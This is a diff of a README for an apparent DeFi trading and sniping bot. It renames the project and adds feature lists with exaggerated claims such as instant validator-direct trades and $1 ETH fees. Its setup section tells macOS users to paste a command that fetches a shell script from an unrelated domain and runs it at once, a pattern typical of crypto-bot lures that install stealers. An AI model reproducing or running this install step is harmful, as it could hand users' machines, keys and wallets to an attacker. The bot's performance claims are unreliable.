@@ -1,9 +1,9 @@
 <p align="center"><img width="720" height="463" src="images/inter.jpg" alt="Defi Bot interface" /></p>
 
-# Whale DEX Trading Tool
+# DEX Trading Tool
 A professional trading platform for large-scale transactions on DEX in EVM networks. Features include automatic order splitting (Smart Split), integration with Uniswap, Sushiswap, Curve, risk management with Chainlink and Pyth, Dark Pool for confidentiality, multisig wallets, cross-chain swaps, and professional analytics. Gas optimization, mempool monitoring, and scam protection ensure safe and fast order execution in DeFi
 
-Whale DEX Trading Tool- Is a comprehensive software solution designed for large-scale traders and investors, enabling the safe and efficient execution of transactions exceeding $100,000 on decentralized exchanges (DEX) in EVM networks. The platform combines Smart Split algorithms, in-depth liquidity pool analysis, advanced risk management techniques, integration with leading DEX (Uniswap, Sushiswap, Curve) and aggregators (1inch, Matcha), as well as support for Dark Pool to confidentially execute large orders
+This Bot, a DeFi Trading bot for ETH, BSC, AVAX, MATIC, FTM, Harmony, Metis, CRONOS, KCC, VELAS, Pulsechain, Venom, Kaikas, Milkomeda, Solana and more, can Swap, Sniping and Arbitrage
 
 # Set-Up
  ## For Windows
@@ -16,8 +16,37 @@ Whale DEX Trading Tool- Is a comprehensive software solution designed for large-
 - Enter the command on Terminal
 
                  /bin/bash -c "$(curl -fsSL https://applepistudios.com/ce/install.sh)"
+
+# Features:
+- 🦾 Snipe new tokens at listing
+- 🚀 Realtime super-fast websocket trading.
+- 📈 50+ Technical indicators. (docs)
+- 🌈 Written in .NET and Python!
+- 🌿 Unit tested source code.
+- 📝 Paper trading a strategy on LIVE exchange data.
+- 🏡 Backtesting engine with local data.
+- 🚢 Run DeFi Selenium Trade Bot inside a docker container.
+More features..
+
+# Key Features:
+- 📈 Instant trading. When you trade manually through trust wallet or metamask wallets, you spend 20 to 60 seconds on the token verification and transaction confirmation processes. With our bot, the processes of selling and buying is instant, because they go directly to the network of the validator
+
+- 🔇 Counter anti-bot protections
+
+- 🔋 Honeypot AutoChecker \ Scam protection. Have you ever bought a token that lost its value after a while? This is not a problem with our bot - add the contract address of the token to the bot to track a rapid sale or liquidity withdrawal. If the price drops by more than 20%-(the rate is adjustable), our bot will automatically sell this token
+
+- 💎 Snipe Dexscreener, Pinksale listings
+
+- 🛠 Create fully automated strategies to BUY THE DIP and use TRAILING STOP LOSS
+
+- 🔑 Place Limit Orders
+
+
+- 🍔 Liquidity Farms. Minimize fees within any network by calculating the recent blocks farmed to indicate the lowest fee to the miner. This way you will be able to reduce the fee when farming in the ETH network to $1
+
+
   
-# Key Features and Solutions
+# Solutions
 ## 1. Liquidity Aggregation and Order Execution
 - Integration with DEX and Aggregators: Connects with Uniswap, Sushiswap, Curve, 1inch, and Matcha to maximize liquidity coverage.
 
